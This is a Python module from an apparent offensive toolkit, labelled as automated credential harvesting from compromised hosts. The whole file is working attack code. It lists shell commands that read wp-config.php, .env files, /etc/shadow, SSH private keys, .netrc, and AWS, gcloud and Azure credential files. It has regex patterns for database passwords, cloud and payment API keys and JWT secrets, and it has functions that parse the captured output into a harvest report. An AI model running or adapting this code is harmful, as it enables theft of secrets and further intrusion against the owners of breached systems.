"""
ZAS Credential Collection — Automated harvesting of credentials from compromised hosts.
Targets wp-config.php, .env, database configs, SSH keys, etc.
"""

import re
import json


# ─── Credential Patterns ───────────────────────────────────────────────────────

PATTERNS = {
    "database": {
        "mysql": [
            r"DB_USER\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"DB_PASSWORD\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"DB_HOST\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"DB_NAME\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"mysql://([^:]+):([^@]+)@([^/]+)/(\w+)",
        ],
        "postgresql": [
            r"PG_USER\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"PG_PASSWORD\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"PG_HOST\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"PG_DATABASE\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"postgres://([^:]+):([^@]+)@([^/]+)/(\w+)",
        ],
        "mongodb": [
            r"MONGO_URI\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"mongodb://([^:]+):([^@]+)@([^/]+)/(\w+)",
        ],
    },
    "api_keys": {
        "aws": [
            r"AWS_ACCESS_KEY_ID\s*[=:]\s*['\"]?([A-Z0-9]{20})",
            r"AWS_SECRET_ACCESS_KEY\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})",
            r"AKIA[A-Z0-9]{16}",
        ],
        "stripe": [
            r"sk_live_[a-zA-Z0-9]{24,}",
            r"pk_live_[a-zA-Z0-9]{24,}",
        ],
        "sendgrid": [
            r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}",
        ],
        "mailgun": [
            r"key-[a-zA-Z0-9]{32}",
        ],
        "twilio": [
            r"AC[a-z0-9]{32}",
        ],
        "slack": [
            r"xox[bps]-[a-zA-Z0-9-]+",
        ],
        "github": [
            r"gh[pousr]_[A-Za-z0-9_]{36,}",
            r"github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}",
        ],
        "google": [
            r"AIza[0-9A-Za-z_-]{35}",
        ],
        "heroku": [
            r"[hH]eroku[a-zA-Z0-9]{32}",
        ],
    },
    "secrets": {
        "jwt": [
            r"JWT_SECRET\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"jwt[_-]?secret[_-]?key\s*[=:]\s*['\"]?([^'\"\s;]+)",
        ],
        "app_key": [
            r"APP_KEY\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"SECRET_KEY\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"SECRET\s*[=:]\s*['\"]?([^'\"\s;]{8,})",
        ],
        "encryption": [
            r"ENCRYPTION_KEY\s*[=:]\s*['\"]?([^'\"\s;]+)",
            r"AUTH_KEY\s*[=:]\s*['\"]?([^'\"\s;]+)",
        ],
    },
    "ssh": {
        "private_key": [
            r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----",
        ],
        "authorized_keys": [
            r"(ssh-rsa|ssh-ed25519|ecdsa-sha2-nistp256)\s+[A-Za-z0-9+/=]+",
        ],
    },
}


# ─── Harvest Commands ──────────────────────────────────────────────────────────

HARVEST_COMMANDS = [
    # WordPress config
    ("wp-config.php", "cat /var/www/*/wp-config.php /var/www/html/wp-config.php /home/*/public_html/wp-config.php 2>/dev/null | head -50"),
    ("wp-config.php (find)", "find / -name 'wp-config.php' -type f 2>/dev/null | head -5"),
    
    # Environment files
    (".env", "cat /var/www/*/.env /var/www/html/.env /home/*/.env 2>/dev/null | head -50"),
    (".env (find)", "find / -name '.env' -type f 2>/dev/null | head -5"),
    
    # Laravel config
    ("laravel config", "cat /var/www/*/config/database.php /var/www/*/config/app.php 2>/dev/null | head -30"),
    
    # Joomla config
    ("joomla config", "cat /var/www/*/configuration.php /var/www/html/configuration.php 2>/dev/null | head -30"),
    
    # Drupal config
    ("drupal config", "cat /var/www/*/sites/default/settings.php 2>/dev/null | head -30"),
    
    # Database credentials
    ("my.cnf", "cat /etc/mysql/my.cnf /root/.my.cnf 2>/dev/null | head -20"),
    (".pgpass", "cat /root/.pgpass /home/*/.pgpass 2>/dev/null"),
    
    # SSH keys
    ("ssh keys", "cat /root/.ssh/id_rsa /home/*/.ssh/id_rsa 2>/dev/null"),
    ("authorized_keys", "cat /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null | head -10"),
    
    # System info
    ("/etc/passwd", "cat /etc/passwd 2>/dev/null | head -20"),
    ("/etc/shadow", "cat /etc/shadow 2>/dev/null | head -10"),
    
    # Process list
    ("processes", "ps aux 2>/dev/null | head -20"),
    
    # Network info
    ("network", "ip addr show 2>/dev/null || ifconfig 2>/dev/null | head -30"),
    ("routes", "ip route 2>/dev/null || route -n 2>/dev/null | head -10"),
    ("hosts", "cat /etc/hosts 2>/dev/null"),
    
    # Crontabs
    ("crontabs", "cat /var/spool/cron/crontabs/* /var/spool/cron/* 2>/dev/null | head -20"),
    
    # Docker
    ("docker", "cat /root/.docker/config.json 2>/dev/null"),
    ("docker-compose", "find / -name 'docker-compose.yml' -type f 2>/dev/null | head -3"),
    
    # Git credentials
    ("git config", "cat /root/.gitconfig /home/*/.gitconfig 2>/dev/null"),
    (".netrc", "cat /root/.netrc /home/*/.netrc 2>/dev/null"),
    
    # Browser credentials
    ("browser cookies", "find /home -name 'cookies.sqlite' -type f 2>/dev/null | head -3"),
    
    # Cloud credentials
    ("aws credentials", "cat /root/.aws/credentials /home/*/.aws/credentials 2>/dev/null"),
    ("gcloud", "cat /root/.config/gcloud/credentials.db 2>/dev/null"),
    ("azure", "cat /root/.azure/accessTokens.json 2>/dev/null"),
]


def parse_credential_output(source, output):
    """Parse shell output for credentials.
    
    Args:
        source: source file/command name
        output: raw shell output
    
    Returns:
        list of dicts with type, source, key, value
    """
    creds = []
    
    if not output or "error" in output.lower()[:50] or "permission denied" in output.lower():
        return creds
    
    # Database credentials
    for db_type, patterns in PATTERNS["database"].items():
        for pattern in patterns:
            for m in re.finditer(pattern, output, re.I):
                groups = m.groups()
                if len(groups) >= 2:
                    creds.append({
                        "type": f"database_{db_type}",
                        "source": source,
                        "key": "credentials",
                        "value": f"{groups[0]}:{groups[1]}@{groups[2] if len(groups) > 2 else 'localhost'}",
                    })
    
    # API keys
    for service, patterns in PATTERNS["api_keys"].items():
        for pattern in patterns:
            for m in re.finditer(pattern, output):
                creds.append({
                    "type": f"api_key_{service}",
                    "source": source,
                    "key": service,
                    "value": m.group(0) if not m.groups() else m.group(1),
                })
    
    # Secrets
    for secret_type, patterns in PATTERNS["secrets"].items():
        for pattern in patterns:
            for m in re.finditer(pattern, output, re.I):
                creds.append({
                    "type": f"secret_{secret_type}",
                    "source": source,
                    "key": secret_type,
                    "value": m.group(0) if not m.groups() else m.group(1),
                })
    
    # SSH keys (just detect, don't store full key)
    for pattern in PATTERNS["ssh"]["private_key"]:
        if re.search(pattern, output):
            creds.append({
                "type": "ssh_private_key",
                "source": source,
                "key": "private_key",
                "value": "[SSH PRIVATE KEY DETECTED]",
            })
    
    for pattern in PATTERNS["ssh"]["authorized_keys"]:
        for m in re.finditer(pattern, output):
            creds.append({
                "type": "ssh_public_key",
                "source": source,
                "key": "authorized_key",
                "value": m.group(0)[:100] + "...",
            })
    
    # Generic key=value pairs
    for m in re.finditer(r'(?i)(password|passwd|secret|token|api.?key|auth|credential)\s*[=:]\s*["\']?([^"\'\s;]{3,})', output):
        key = m.group(1).lower()
        value = m.group(2)
        # Skip common false positives
        if value not in ('null', 'none', 'false', 'true', '""', "''", '*', '#'):
            creds.append({
                "type": "generic_credential",
                "source": source,
                "key": key,
                "value": value,
            })
    
    return creds


def format_creds_report(credentials):
    """Format credentials into a readable report.
    
    Args:
        credentials: list of credential dicts
    
    Returns:
        str: formatted report
    """
    if not credentials:
        return "No credentials found."
    
    lines = ["=" * 60]
    lines.append("  CREDENTIAL HARVEST REPORT")
    lines.append("=" * 60)
    lines.append("")
    
    # Group by type
    by_type = {}
    for cred in credentials:
        t = cred["type"]
        if t not in by_type:
            by_type[t] = []
        by_type[t].append(cred)
    
    for cred_type, creds in sorted(by_type.items()):
        lines.append(f"  [{cred_type.upper()}]")
        for c in creds:
            lines.append(f"    Source: {c['source']}")
            lines.append(f"    Key:    {c['key']}")
            lines.append(f"    Value:  {c['value']}")
            lines.append("")
    
    lines.append("=" * 60)
    lines.append(f"  Total: {len(credentials)} credential(s) found")
    lines.append("=" * 60)
    
    return "\n".join(lines)